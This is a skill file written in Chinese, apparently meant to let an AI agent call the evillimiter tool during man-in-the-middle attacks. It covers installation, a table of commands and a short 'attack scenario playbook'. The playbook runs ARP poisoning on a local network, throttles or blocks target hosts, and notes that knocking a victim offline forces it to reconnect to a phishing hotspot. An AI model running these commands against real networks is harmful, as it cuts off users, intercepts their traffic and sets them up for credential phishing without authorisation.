---
name: evillimiter-mitm-limit
description: 渗透工具 skill:evillimiter 的安装、参数速查与攻击场景 playbook。当任务涉及 嗅探与中间人攻击 需要调用 evillimiter 时使用。
---

# evillimiter

- 攻击大类:C40 嗅探与中间人攻击
- 上游仓库:https://github.com/bitbrute/evillimiter
- 上游 License:MIT(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
git clone https://github.com/bitbrute/evillimiter && cd evillimiter && pip install -r requirements.txt
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `evillimiter -i eth0` | 局域网 ARP 毒化+限速 |
| `scan` | 扫描主机 |
| `limit 192.168.1.5` | 限速目标 |
| `block all` | 断网全部 |
| `free 192.168.1.5` | 解除 |

## 攻击场景 Playbook

### 内网 ARP 拦截

```bash
evillimiter -i eth0 && scan && block 192.168.1.10
# 断网迫使目标重连,配合钓鱼热点
```

## 注意事项

局域网 ARP 中间人+带宽控制,内网渗透辅助。
